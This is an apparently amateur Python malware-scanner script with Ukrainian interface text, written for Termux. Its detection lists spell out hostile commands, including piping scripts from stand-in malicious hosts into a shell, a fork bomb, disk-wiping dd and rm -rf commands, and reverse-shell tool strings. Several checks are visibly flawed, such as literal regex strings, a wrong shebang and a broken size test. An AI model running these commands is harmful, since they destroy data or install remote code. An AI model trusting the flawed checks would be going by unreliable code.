#!/data/data/com.termux/files/usr/bin/bash
import os
import sys
import time
import subprocess
import re
from datetime import datetime

# ============================================
#   TBFPUMBA-SckanerOp v5.0 (PRO EDITION)
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

# Кольорові коди
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Розширений список підозрілих паттернів
SUSPICIOUS_PATTERNS = [
    "rm -rf", "format", "delete_all", "malware", "virus",
    "backdoor", "trojan", "rootkit", "keylogger", "ransomware",
    "cryptominer", "exploit", "payload", "shellcode", "reverse shell",
    "nc -e", "bash -i", "python -c", "perl -e", "curl.*|sh",
    "wget.*|bash", "eval", "exec", "system", "popen", "subprocess",
    "os.system", "os.popen", "subprocess.Popen", "subprocess.call",
    "open('", "read('", "write('", "chmod", "chown", "mount", "umount"
]

HIGH_RISK_PATTERNS = [
    "rm -rf --no-preserve-root",
    "dd if=/dev/zero of=/dev/block",
    "mkfs.ext4 /dev/block",
    "chmod 777 /system",
    "mount -o rw,remount /system",
    "curl http://malicious-site.com/install.sh | bash",
    "wget https://evil-domain.com/payload.sh | sh",
    "base64 -d | sh",
    "eval $(cat /dev/urandom | base64)",
    "iptables -F",
    "iptables -X",
    "killall -9",
    "pkill -f",
    ":(){ :|:& };:",
    "sudo rm -rf /",
    "dd if=/dev/zero of=/dev/sda",
    "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
]

# Підозрілі дозволи для APK
SUSPICIOUS_PERMISSIONS = [
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECORD_AUDIO",
    "android.permission.CAMERA",
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_PHONE_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION"
]

SUSPICIOUS_APK_PATTERNS = [
    "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
    "crypto", "miner", "steal", "fake", "clone", "spy", "track"
]

def rainbow_print(text):
    os.system(f'echo "{text}" | lolcat 2>/dev/null || echo "{text}"')

def color_print(text, color=WHITE):
    print(f"{color}{text}{RESET}")

def loading_bar(title, duration=0.01):
    print(f"\n{BLUE}⏳ {title}{RESET}")
    for i in range(101):
        time.sleep(duration)
        bar = "█" * (i // 2) + "░" * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
    print(f"\n{GREEN}✅ Готово!{RESET}\n")

def show_help():
    os.system('clear')
    rainbow_print("📖 TBFPUMBA-SckanerOp v5.0 — Довідка")
    rainbow_print("========================================")
    rainbow_print("🛡️  Про програму:")
    rainbow_print("  Потужний сканер безпеки для виявлення")
    rainbow_print("  підозрілих та критичних загроз у файлах.")
    rainbow_print("")
    rainbow_print("🚀  Як запустити:")
    rainbow_print("  python tbfpumba_scan.py")
    rainbow_print("")
    rainbow_print("⚙️  Команди:")
    rainbow_print("  help  — показати це керівництво")
    rainbow_print("  y     — запустити сканування")
    rainbow_print("  n     — вийти")
    rainbow_print("")
    rainbow_print("📂  Що сканується:")
    rainbow_print("  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh")
    rainbow_print("  - .apk файли (аналіз назви, дозволів, розміру)")
    rainbow_print("  - Системні папки: /system, /data, /etc")
    rainbow_print("")
    rainbow_print("🔴  Рівні загроз:")
    rainbow_print("  🔴 Критична — може пошкодити систему")
    rainbow_print("  🟡 Підозріла — потребує перевірки")
    rainbow_print("  🔵 Інформаційна — для відома")
    rainbow_print("")
    rainbow_print("🔒  Безпека:")
    rainbow_print("  Сканер не змінює файли, тільки аналізує.")
    rainbow_print("========================================")
    input("\nНатисніть Enter, щоб закрити довідку...")

def check_apk(filepath):
    """Аналізує APK файл без розпакування"""
    results = []
    filename = os.path.basename(filepath).lower()
    size = os.path.getsize(filepath) // (1024 * 1024)  # Розмір у МБ
    
    # Перевірка назви
    for pattern in SUSPICIOUS_APK_PATTERNS:
        if pattern in filename:
            results.append(("🔴", f"Підозріла назва: {pattern}"))
            break
    
    # Перевірка розміру (занадто маленький APK може бути підозрілим)
    if size < 0.5:  # Менше 0.5 МБ
        results.append(("🟡", f"Занадто маленький розмір: {size} МБ"))
    elif size > 100:  # Більше 100 МБ
        results.append(("🟡", f"Дуже великий розмір: {size} МБ"))
    
    # Перевірка прав (симуляція)
    try:
        cmd = f"aapt dump permissions {filepath} 2>/dev/null"
        output = subprocess.getoutput(cmd)
        for perm in SUSPICIOUS_PERMISSIONS:
            if perm in output:
                results.append(("🟡", f"Підозрілий дозвіл: {perm}"))
    except:
        pass
    
    return results

def scan_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            # Перевірка на критичні загрози
            for pattern in HIGH_RISK_PATTERNS:
                if pattern in content:
                    return "🔴", pattern
            # Перевірка на підозрілі
            for pattern in SUSPICIOUS_PATTERNS:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_folder(path):
    suspicious_files = []
    total_files = 0
    scanned_files = 0
    
    # Підрахунок файлів для прогресу
    for root, dirs, files in os.walk(path):
        total_files += len(files)
    
    loading_bar(f"Сканування папки: {path}", 0.005)
    
    for root, dirs, files in os.walk(path):
        for file in files:
            scanned_files += 1
            filepath = os.path.join(root, file)
            
            # Пропускаємо сам сканер
            if filepath == os.path.realpath(__file__):
                continue
            
            # Аналіз APK
            if file.endswith('.apk'):
                print(f"{CYAN}📦 APK файл: {filepath}{RESET}")
                apk_results = check_apk(filepath)
                for level, msg in apk_results:
                    suspicious_files.append((filepath, level, msg))
                    if level == "🔴":
                        color_print(f"🔴 КРИТИЧНО: {filepath} -> {msg}", RED)
                    else:
                        color_print(f"🟡 ПОПЕРЕДЖЕННЯ: {filepath} -> {msg}", YELLOW)
                continue
            
            # Аналіз текстового вмісту для інших файлів
            if file.endswith(('.txt', '.sh', '.py', '.js', '.c', '.cpp', '.bash', '.zsh')):
                level, pattern = scan_file(filepath)
                if level:
                    suspicious_files.append((filepath, level, pattern))
                    if level == "🔴":
                        color_print(f"🔴 КРИТИЧНА ЗАГРОЗА: {filepath} (знайдено: '{pattern}')", RED)
                    else:
                        color_print(f"🟡 ПІДОЗРІЛИЙ ФАЙЛ: {filepath} (знайдено: '{pattern}')", YELLOW)
            
            # Перевірка прав доступу (системні папки)
            if root.startswith(('/system', '/data', '/etc')):
                try:
                    import stat
                    mode = os.stat(filepath).st_mode
                    if mode & stat.S_IRWXO:  # Дозвіл для інших (777)
                        suspicious_files.append((filepath, "🟡", "Права доступу 777 (всі можуть змінювати)"))
                        color_print(f"🟡 ПРАВА: {filepath} -> 777 (небезпечно!)", YELLOW)
                except:
                    pass
            
            # Прогрес
            if scanned_files % 50 == 0:
                print(f"{BLUE}📊 Прогрес: {scanned_files}/{total_files}{RESET}")
    
    return suspicious_files

if __name__ == "__main__":
    os.system('clear')
    rainbow_print("🔥 TBFPUMBA-SckanerOp v5.0 (PRO EDITION) 🔥")
    rainbow_print("⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡")
    rainbow_print("========================================")
    
    loading_bar("Ініціалізація сканера", 0.02)
    
    while True:
        answer = input("⚠️ Запустити сканування? (y/n/help): ").lower()
        if answer in ['y', 'yes']:
            break
        elif answer in ['n', 'no']:
            rainbow_print("❌ Сканування скасовано.")
            sys.exit()
        elif answer == 'help':
            show_help()
            continue
        else:
            print("❗ Введіть 'y', 'n' або 'help'.")
    
    target_path = os.path.expanduser("~")
    results = scan_folder(target_path)
    
    if results:
        critical = [r for r in results if r[1] == "🔴"]
        suspicious = [r for r in results if r[1] == "🟡"]
        
        print("\n" + "="*50)
        rainbow_print("🔍 РЕЗУЛЬТАТИ СКАНУВАННЯ")
        print("="*50)
        
        if critical:
            color_print("\n🔴🔴🔴 КРИТИЧНІ ЗАГРОЗИ:", RED)
            for file, level, msg in critical:
                color_print(f"  🔴 {file} -> {msg}", RED)
        
        if suspicious:
            color_print("\n🟡 ПІДОЗРІЛІ ФАЙЛИ:", YELLOW)
            for file, level, msg in suspicious:
                color_print(f"  🟡 {file} -> {msg}", YELLOW)
        
        if not critical and not suspicious:
            rainbow_print("\n✅ Підозрілих файлів не знайдено. Ваша система чиста!")
        
        color_print(f"\n🔒 Сканування завершено. Знайдено: {len(results)} підозрілих файлів.", BLUE)
    else:
        rainbow_print("\n✅ Підозрілих файлів не знайдено. Ваша система чиста!")
    
    input("\nНатисніть Enter, щоб вийти...")
